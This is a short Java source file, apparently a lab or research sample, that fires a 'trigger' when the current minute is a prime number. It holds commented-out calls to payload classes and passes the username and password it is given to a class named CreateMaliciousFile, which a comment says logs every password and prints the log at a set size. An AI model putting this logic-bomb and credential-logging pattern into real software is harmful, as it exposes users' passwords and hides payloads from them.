package com.br.usp.larc;
import java.io.UnsupportedEncodingException;
import java.security.NoSuchAlgorithmException;
import java.util.Calendar;

/**
 * main
 */
public class Main {

    public static boolean isPrime(int num) {
        if (num <= 1) {
            return false;
        }
        for (int i = 2; i <= Math.sqrt(num); i++) {
            if (num % i == 0) {
                return false;
            }
        }
        return true;
    }

    public static void run(String[] args, TimeProvider timeProvider) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        String username = args[0];
        String password = args[1];

        long startTime = timeProvider.getCurrentTimeMillis();

        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(timeProvider.getCurrentTimeMillis());
        int currentMinute = calendar.get(Calendar.MINUTE);

        /// End of conversion
        if (isPrime(currentMinute)) {
            System.out.println("Trigger activated: Current minute is a prime number");
            //PayloadUsesExec.run();
            //PayloadUsesProcessBuilder.run();
        }
        System.out.println(timeProvider.getCurrentTimeMillis() - startTime);

        // create a file logging all passwords and login input. Then, when this file
        // reaches a specific size, print the file.
        CreateMaliciousFile.insertAtFile(username, password);
    }

    public static void main(String[] args) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        TimeProvider timeProvider = new TimeProvider();
        run(args, timeProvider);
    }

}
